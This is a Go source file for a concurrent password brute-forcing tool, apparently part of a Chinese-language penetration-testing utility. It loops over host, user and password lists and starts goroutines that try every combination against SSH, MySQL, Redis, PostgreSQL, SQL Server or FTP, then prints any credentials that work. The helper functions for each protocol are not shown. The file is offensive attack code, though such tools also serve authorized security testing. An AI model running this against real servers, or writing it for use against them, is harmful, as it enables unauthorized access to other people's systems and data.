package crack

import (
	"context"
	"fmt"
	"github.com/spf13/cobra"
	"sync"
)

var (
	ch = make(chan struct{}, 30)
	wg = sync.WaitGroup{}
)

func Run(cmd *cobra.Command, args []string) {
	info := parseFlags(cmd)
	fmt.Printf("[*] 运行暴力破解模式:%s,主机:%d个,尝试用户%d个,尝试密码%d个,主机需单独%d次尝试 请求最高等待时常:%d/s 线程数:%d \n", info.Mode, len(info.IP), len(info.User), len(info.Passwd), len(info.User)*len(info.Passwd), info.Timeout, info.Chan)
	ch = make(chan struct{}, info.Chan)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel() //
	// 确保所有的goroutine都已经退出
	for _, ip := range info.IP {
		if !info.NoPing { //true为跳过ping
			if !NetWorkStatus(ip) {
				fmt.Printf("[-] 网络不可达：%s,可通过--noping跳过ping检测\n", ip)
				continue
			}
		}
		for _, user := range info.User {
			for _, passwd := range info.Passwd {
				ch <- struct{}{}
				wg.Add(1)
				switch info.Mode {
				case "ssh":
					go SSH(ctx, cancel, ip, user, passwd, info.Prot, info.Timeout)
				case "mysql":
					go mySql(ctx, cancel, ip, user, passwd, info.Prot, info.Timeout)
				case "redis":
					go rediscon(ip, user, passwd, info.Prot, info.Timeout) //因为redis特征可以一个用户多密码，所以让字典跑完
				case "pgsql":
					go pgsql(ctx, cancel, ip, user, passwd, info.Prot, info.Timeout)
				case "sqlserver":
					go sqlservercon(ctx, cancel, ip, user, passwd, info.Prot, info.Timeout)
				case "ftp":
					go ftpcon(ip, user, passwd, info.Prot, info.Timeout) //因为ftp匿名账户的问题，所以让字典跑完
				}
			}
		}
	}
	wg.Wait()
}

// end 结束
func end(ip, user, passwd string, port int) {
	fmt.Printf("[*] 发现口令！IP:%s  用户:%s  密码:%s  端口:%d  \n", ip, user, passwd, port)
}
